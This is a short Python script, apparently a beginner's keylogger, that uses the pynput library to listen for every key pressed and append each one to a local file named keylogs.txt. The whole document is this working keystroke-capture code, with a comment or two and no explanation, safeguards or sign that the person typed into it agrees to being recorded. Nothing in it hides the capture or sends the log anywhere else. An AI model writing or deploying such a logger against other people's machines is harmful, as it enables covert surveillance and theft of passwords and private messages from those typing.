
# import some methods in keyboard 
from pynput.keyboard import Key, Listener

def on_press(key):
    with open("keylogs.txt", "a") as f:
        f.write(str(key) + "\n")#write data

with Listener(on_press=on_press) as listener:
    listener.join()